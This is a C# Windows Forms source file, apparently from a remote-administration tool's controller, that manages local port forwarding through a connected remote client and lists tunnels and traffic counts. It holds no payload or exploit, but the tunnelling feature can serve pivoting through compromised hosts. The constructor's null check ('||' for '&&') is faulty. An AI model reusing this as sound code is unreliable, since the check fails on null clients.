using System;
using System.Windows.Forms;
using xServer.Core.Networking;
using xServer.Core.PortForward.Local;
using System.Collections.Generic;
using xServer.Core.Helper;

namespace xServer.Forms
{
    public partial class FrmPortForwardLocal : Form
    {
        // Keep track of multiple forward instances
        private readonly LocalPortForwardTracker _tracker;
        private readonly Client _client;
        private Timer _refreshTimer;

        private List<LocalPortForwardClient> _forwardClients;
        private List<LocalPortForwardServer> _forwardServers;

        public FrmPortForwardLocal(Client c)
        {
            this._client = c;
            this._tracker = new LocalPortForwardTracker(c);
            if (c != null || c.Value != null)
            {
                c.Value.FrmFwdFromLocal = this;
                c.Value.LocalPortForwardTracker = _tracker;
            }
            
            _refreshTimer = new Timer();
            _refreshTimer.Tick += RefreshTimer_Tick;
            _refreshTimer.Interval = 1000;
            _refreshTimer.Start();

            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            LocalPortForwardServer server =
                this._tracker.CreateServer(txtFwdHost.Text, (int)nudFwdPort.Value, (int)nudClientPort.Value);

            server.StartServer();
        }

        void RefreshTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (_tracker)
                {
                    _forwardClients = _tracker.GetClientsList();
                    lstConnections.VirtualListSize = _forwardClients.Count;
                    lstConnections.Refresh();

                    _forwardServers = new List<LocalPortForwardServer>(_tracker.ForwardServers);
                    lstServers.VirtualListSize = _forwardServers.Count;
                    lstServers.Refresh();
                }
            }
            catch { }
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            if (e.ItemIndex < this._forwardClients.Count)
            {
                LocalPortForwardClient client = _forwardClients[e.ItemIndex];

                e.Item = new ListViewItem(new string[]
                {
                    client.ForwardServer.LocalPort.ToString(),
                    client.ForwardServer.RemoteHost.ToString(),
                    client.ForwardServer.RemotePort.ToString(),
                    client.Client.EndPoint.ToString(),
                    client.ClientSocketInfo,
                    client.LengthReceived.ToString(),
                    client.LengthSent.ToString()
                }) { Tag = client };
            }
        }

        private void LvServers_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            if (e.ItemIndex < this._forwardServers.Count)
            {
                LocalPortForwardServer server = _forwardServers[e.ItemIndex];

                e.Item = new ListViewItem(new string[]
                {
                    server.LocalPort.ToString(),
                    server.RemoteHost.ToString(),
                    server.RemotePort.ToString(),
                    (server.IsUp ? "Up" : "Down" )
                })
                { Tag = server };
            }
        }

        private void FrmPortForwardLocal_FormClosing(object sender, EventArgs e)
        {
            lock (_tracker)
            {
                // Reverse loop for safe disconnect (remove)
                for (int i = _tracker.ForwardServers.Count - 1; i >= 0; i--)
                {
                    _tracker.ForwardServers[i].Disconnect();
                }
            }
            _client.Value.FrmFwdFromLocal = null;
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstServers.SelectedIndices.Count > 0)
            {
                //copy the list, it could happen the suddenly the items de-select
                int[] items = new int[lstServers.SelectedIndices.Count];
                lstServers.SelectedIndices.CopyTo(items, 0);

                foreach (int index in items)
                {
                    if (index < _tracker.ForwardServers.Count)
                    {
                        _tracker.ForwardServers[index].Disconnect();
                    }
                }
            }
            else
            {
                MessageBox.Show("Please select one");
            }
        }
        
    }

    //private void restartToolStripMenuItem_Click(object sender, EventArgs e)
    //{
    //    if (lstConnections.SelectedIndices.Count > 0)
    //    {
    //        //copy the list, it could happen the suddenly the items de-select
    //        int[] items = new int[lstConnections.SelectedIndices.Count];
    //        lstConnections.SelectedIndices.CopyTo(items, 0);

    //        foreach (int index in items)
    //        {
    //            if (index < _connections.Count)
    //            {
    //                PortForwardInstance connection = _connections[index];
    //                if (connection != null)
    //                {
    //                    connection.SendInit();
    //                }
    //            }
    //        }
    //    }
    //    else
    //    {
    //        MessageBox.Show("Please select at least one connection");
    //    }
    //}
}
